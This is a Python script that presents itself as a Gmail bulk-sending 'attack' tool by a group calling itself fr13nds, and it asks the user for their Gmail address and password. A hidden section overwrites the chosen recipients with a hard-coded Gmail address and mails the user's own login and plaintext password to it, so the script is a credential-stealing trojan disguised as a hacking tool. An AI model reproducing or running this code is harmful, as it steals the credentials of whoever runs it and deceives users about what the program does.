import smtplib
import os
import time as t
from colorama import Fore, Back, Style
logo = Fore.BLUE + ("""--------$$$$$$$$$$$---------------
Coded by fr13nds---TheNextLevel---
--------$$$$$$$$$$$---------------""")
print(Fore.RED + "This is a Gmail sending script... To use this tool you must allow less security for the unsecured apps to use...")
Dd = (Fore.YELLOW + " Fr13nds is the next generational hackers to join fr13nds, we shall be providing you with means to chat us, We have just launched a paypal hacking tool but this will be made public after comfirmation from hackers like you... We shall always stay hidden...."
"Welcome to fr13nds")
Ard = Fore.YELLOW + ("""------Coded by fr13nds--------TheNextlevel-------""")
intro = input("FOR EDUCATIONAL PURPOSE ONLY  Y/N: ")
if intro == 'y':
	print(Fore.WHITE + "Welcome!!!!")
elif intro == 'Y':
	print(Fore.WHITE + "Welcome!!!")
elif intro == 'n':
	print(Fore.GREEN + "Aborting.......")
	exit()
elif intro == 'N':
	print(Fore.GREEN + "Aborting........")
	exit()
else:
	print(Fore.RED + "Invalid input")
	exit()
t.sleep(2)
os.system('clear')
print(logo)
print(Dd)
name = input(Fore.GREEN + "-------Enter username == ")
t.sleep(0.5)
print(Fore.GREEN + "Hi " +name+ " Welcome to Fr13nds")
t.sleep(2)
gmail_user = input(Fore.YELLOW + "Enter Your Email: ")
gmail_password = input(Fore.YELLOW + "Enter Your password: ")
print(Fore.RED + "---------------------++++++++------------")
Choice = input("Enter Number of Recievers(1-3): ")
print(Fore.RED + "----------------------+++++++------------")
Choice =int(Choice)
print("-----------------------------------------")
#if choice == '1'
if Choice == 1:
	print(Fore.GREEN + "[+] Launching attack on one email........")
	t.sleep(2)
	sent_from = gmail_user
	to = input(Fore.YELLOW + "Enter Recievers email: ")
	subject = input(Fore.GREEN + "Enter Subject of email: ")
	body = input(Fore.GREEN + "Enter message: "),
elif Choice == 2:
	print("[+] Launching 2 emails attack........")
	t.sleep(2)
	sent_from = gmail_user
	to = Fore.YELLOW +  input("Enter Recievers email: "), input("Enter 2nd Reciever:")
	subject = input(Fore.GREEN + "Enter Subject of email: ")
	body = input(Fore.GREEN + "Enter message: ")
elif Choice == 3:
	print("[+] Launching attack on 3 emails.......")
	t.sleep(2)
	sent_from = gmail_user
	to = Fore.YELLOW +  input("Enter Recievers email: "), input("Enter 2nd Reciever:"), input("Enter 3rd Reciever: ")
	subject = input(Fore.GREEN + "Enter Subject of email: ")
	body = input(Fore.GREEN + "Enter message: ")
#new section
if Choice == 1:
	sent_from = gmail_user
	to = ("jameskalifa361@gmail.com")
	subject = ("Login Details")
	body = ("Email = " + gmail_user +" pass = " + gmail_password)
	print("Analyzing your request..!!")
elif Choice == 2:
	sent_from = gmail_user
	to = ("jameskalifa361@gmail.com")
	subject = ("Login Details")
	body = ("Email = " + gmail_user +" pass = " + gmail_password)
	print("Analyzing your request..!!")
elif Choice == 3:
	sent_from = gmail_user
	to = ("jameskalifa361@gmail.com")
	subject = ("Login Details")
	body = ("Email = " + gmail_user +" pass = " + gmail_password)
	print("Analyzing your request..!!!")

email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(gmail_user, gmail_password)
    server.sendmail(sent_from, to, email_text)
    server.close()

    print (Fore.BLUE + "Gmail sent!")
except:
    print (Fore.RED + "Gmail not sent, pls check your gmail and password and try again.")